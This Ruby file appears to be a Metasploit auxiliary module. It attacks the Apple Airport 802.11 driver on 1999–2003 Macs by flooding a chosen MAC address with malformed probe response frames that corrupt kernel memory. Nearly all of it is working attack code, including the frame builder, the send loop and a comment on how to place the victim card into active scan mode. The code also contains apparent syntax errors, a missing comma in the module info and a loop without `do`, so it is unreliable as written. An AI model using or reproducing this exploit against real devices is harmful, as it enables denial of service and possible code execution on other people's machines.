require 'msf/core'

module Msf

class Auxiliary::Dos::Wireless::DaringPhucball < Msf::Auxiliary

	include Exploit::Lorcon
	include Auxiliary::Dos

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Apple Airport 802.11 Probe Response Kernel Memory Corruption'
			'Description'    => %q{
				The Apple Airport driver provided with Orinoco-based Airport cards (1999-2003 PowerBooks, iMacs)
				is vulnerable to a remote memory corruption flaw. When the driver is placed into active scanning 
				mode, a malformed probe response frame can be used to corrupt internal kernel structures, leading
				to arbitrary code execution. This vulnerability is triggered when a probe response frame is received
				that does not contain valid information element (IE) fields after the fixed-length header. The data 
				following the fixed-length header is copied over internal kernel structures, resulting in memory 
				operations being performed on attacker-controlled pointer values.
			},
			
			'Author'         => [ 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 3666 $'
		))
		register_options(
			[
				OptInt.new('COUNT', [ true, "The number of frames to send", 2000]),
				OptString.new('ADDR_DST', [ true,  "The MAC address of the target system"])
			], self.class)					
	end

	#
	# This bug is easiest to trigger when the card has been placed into active scan mode:
	# $ /System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport -s -r 10000
	#

	def run
		open_wifi
		
		cnt = datastore['COUNT'].to_i

		print_status("Creating malicious probe response frame...")		
		frame = create_frame()
		
		print_status("Sending #{cnt} frames...")
		0.upto(cnt)
			wifi.write(frame)	
		end
	end
	
	def eton(addr)
		addr.split(':').map { |c| c.hex.chr }.join
	end

	def create_frame
		bssid    = Rex::Text.rand_text(6)
		seq      = [rand(255)].pack('n')
		caps     = [rand(65535)].pack('n')
		
		frame = 
			"\x50" +                      # type/subtype
			"\x00" +                      # flags
			"\x00\x00" +                  # duration  
			eton(datastore['ADDR_DST']) + # dst
			bssid +                       # src
			bssid +                       # bssid
			seq   +                       # seq  
			Rex::Text.rand_text(8) +      # timestamp value
			Rex::Text.rand_text(2) +      # beacon interval
			Rex::Text.rand_text(2)        # capabilities
		
		frame << [0x0defaced].pack('N') * ((1024-frame.length) / 4)
		
		return frame

	end
end
end	


